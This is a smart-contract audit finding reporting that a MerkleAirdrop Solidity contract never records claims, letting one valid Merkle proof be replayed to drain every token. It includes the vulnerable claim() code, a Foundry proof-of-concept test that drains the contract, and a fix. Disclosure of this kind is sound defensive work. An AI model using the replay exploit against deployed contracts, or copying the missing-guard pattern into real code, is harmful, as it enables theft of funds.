### [H-02] Missing `hasClaimed` Mapping Allows Unlimited Proof Replay, Draining All Tokens

**Affected Files**: `src/MerkleAirdrop.sol`

#### Description

`claim()` performs zero state writes on success. No `hasClaimed[account]` mapping or equivalent guard exists anywhere in the contract. Since Merkle proof verification is deterministic, the same `(account, amount, proof)` triple passes validation on every call, transferring `amount` tokens each time until the contract balance is zero.

```solidity
// src/MerkleAirdrop.sol

function claim(address account, uint256 amount, bytes32[] calldata merkleProof) external payable {
    if (msg.value != FEE) {
        revert MerkleAirdrop__InvalidFeeAmount();
    }
    bytes32 leaf = keccak256(bytes.concat(keccak256(abi.encode(account, amount))));
    if (!MerkleProof.verify(merkleProof, i_merkleRoot, leaf)) {
        revert MerkleAirdrop__InvalidProof();
    }
    emit Claimed(account, amount);
    i_airdropToken.safeTransfer(account, amount);
    // @> No storage write. hasClaimed[account] is never set.
    // @> Proof remains valid for every future call indefinitely.
}
```

#### Risk

**Likelihood:**
- Merkle tree data (addresses, amounts, proofs) is publicly derivable from `tree.json`; any observer can execute the attack immediately after the contract is funded.
- Cost per replay: `1 gwei + gas` — economically negligible compared to any meaningful token value.

**Impact:**
- The entire 100 USDC balance can be drained in a single transaction loop for ~4 gwei total.
- The three other eligible recipients receive nothing — the protocol's stated distribution goal is completely defeated.

#### Proof of Concept

```solidity
function test_H02_ReplayDrainsEntireContract() public {
    vm.deal(collectorOne, airdrop.getFee() * 4);
    vm.startPrank(collectorOne);

    // Same (account, amount, proof) replayed 4 times — all succeed
    airdrop.claim{value: airdrop.getFee()}(collectorOne, amountToCollect, proof);
    airdrop.claim{value: airdrop.getFee()}(collectorOne, amountToCollect, proof);
    airdrop.claim{value: airdrop.getFee()}(collectorOne, amountToCollect, proof);
    airdrop.claim{value: airdrop.getFee()}(collectorOne, amountToCollect, proof);
    vm.stopPrank();

    // Entire contract drained for 4 gwei
    assertEq(token.balanceOf(address(airdrop)), 0);
    assertEq(token.balanceOf(collectorOne), amountToCollect * 4);
}
```

#### Recommended Mitigation

```diff
+ mapping(address => bool) private s_hasClaimed;
+ error MerkleAirdrop__AlreadyClaimed();

  function claim(address account, uint256 amount, bytes32[] calldata merkleProof) external payable {
      if (msg.value != FEE) {
          revert MerkleAirdrop__InvalidFeeAmount();
      }
+     if (s_hasClaimed[account]) {
+         revert MerkleAirdrop__AlreadyClaimed();
+     }
      bytes32 leaf = keccak256(bytes.concat(keccak256(abi.encode(account, amount))));
      if (!MerkleProof.verify(merkleProof, i_merkleRoot, leaf)) {
          revert MerkleAirdrop__InvalidProof();
      }
+     s_hasClaimed[account] = true;
      emit Claimed(account, amount);
      i_airdropToken.safeTransfer(account, amount);
  }
```

